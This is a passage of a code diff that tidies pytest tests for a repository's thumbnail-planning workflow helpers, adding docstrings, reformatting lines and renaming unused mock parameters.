+    """Test thumbnail plan skip verification false for followup with extra files."""
     monkeypatch.chdir(tmp_path)
-    write_text(
-        tmp_path / "apps" / "loan-amortization" / "index.html", "<html></html>\n"
-    )
+    write_text(tmp_path / "apps" / "loan-amortization" / "index.html", "<html></html>\n")
     (tmp_path / "apps" / "loan-amortization" / "thumbnail.webp").write_bytes(b"thumb")
     monkeypatch.setattr(
         workflow_helpers,
         "_run_gh_api",
-        lambda *args, **kwargs: (
-            "apps/loan-amortization/thumbnail.webp\n"
-            "apps/loan-amortization/index.html\n"
+        lambda *_args, **_kwargs: (
+            "apps/loan-amortization/thumbnail.webp\napps/loan-amortization/index.html\n"
         ),
     )
     monkeypatch.setattr(
         workflow_helpers,
         "associated_pr_kind_for_commit",
-        lambda repo, commit_sha: "thumbnail-followup",
+        lambda _repo, _commit_sha: "thumbnail-followup",
     )
     monkeypatch.setattr(
         workflow_helpers,
         "list_commit_files",
-        lambda **kw: [
+        lambda **_kw: [
             "apps/loan-amortization/thumbnail.webp",
             "apps/loan-amortization/index.html",
         ],
@@ -1008,23 +1066,23 @@ def test_thumbnail_plan_skip_verification_false_for_followup_with_extra_files(
 def test_thumbnail_plan_skip_verification_false_on_followup_api_error(
     tmp_path: Path, monkeypatch: pytest.MonkeyPatch
 ) -> None:
+    """Test thumbnail plan skip verification false on followup api error."""
     monkeypatch.chdir(tmp_path)
-    write_text(
-        tmp_path / "apps" / "loan-amortization" / "index.html", "<html></html>\n"
-    )
+    write_text(tmp_path / "apps" / "loan-amortization" / "index.html", "<html></html>\n")
     (tmp_path / "apps" / "loan-amortization" / "thumbnail.webp").write_bytes(b"thumb")
     monkeypatch.setattr(
         workflow_helpers,
         "_run_gh_api",
-        lambda *args, **kwargs: "apps/loan-amortization/thumbnail.webp\n",
+        lambda *_args, **_kwargs: "apps/loan-amortization/thumbnail.webp\n",
     )
     monkeypatch.setattr(
         workflow_helpers,
         "associated_pr_kind_for_commit",
-        lambda repo, commit_sha: "thumbnail-followup",
+        lambda _repo, _commit_sha: "thumbnail-followup",
     )
 
-    def raise_api_error(**kw: object) -> list[str]:
+    def raise_api_error(**_kw: object) -> list[str]:
+        """Raise api error."""
         raise RuntimeError("gh api failed")
 
     monkeypatch.setattr(
@@ -1050,19 +1108,18 @@ def test_thumbnail_plan_skip_verification_false_on_followup_api_error(
 def test_thumbnail_plan_skip_verification_defaults_to_false_without_actor(
     tmp_path: Path, monkeypatch: pytest.MonkeyPatch
 ) -> None:
+    """Test thumbnail plan skip verification defaults to false without actor."""
     monkeypatch.chdir(tmp_path)
-    write_text(
-        tmp_path / "apps" / "loan-amortization" / "index.html", "<html></html>\n"
-    )
+    write_text(tmp_path / "apps" / "loan-amortization" / "index.html", "<html></html>\n")
     monkeypatch.setattr(
         workflow_helpers,
         "_run_gh_api",
-        lambda *args, **kwargs: "apps/loan-amortization/js/app.js\n",
+        lambda *_args, **_kwargs: "apps/loan-amortization/js/app.js\n",
     )
     monkeypatch.setattr(
         workflow_helpers,
         "associated_pr_kind_for_commit",
-        lambda repo, commit_sha: "none",
+        lambda _repo, _commit_sha: "none",
     )
 
     plan = workflow_helpers.thumbnail_plan(
@@ -1075,12 +1132,12 @@ def test_thumbnail_plan_skip_verification_defaults_to_false_without_actor(
     assert plan["skip_verification"] is False
 
 
-def test_main_thumbnail_plan_passes_actor_and_bot_login(
-    monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
-) -> None:
+def test_main_thumbnail_plan_passes_actor_and_bot_login(monkeypatch: pytest.MonkeyPatch) -> None:
+    """Test main thumbnail plan passes actor and bot login."""
     captured: dict[str, object] = {}
 
     def fake_plan(**kwargs: object) -> dict[str, object]:
+        """Fake plan."""
         captured.update(kwargs)
         return {"persist_mode": "none", "reason": "stub", "skip_verification": False}
 
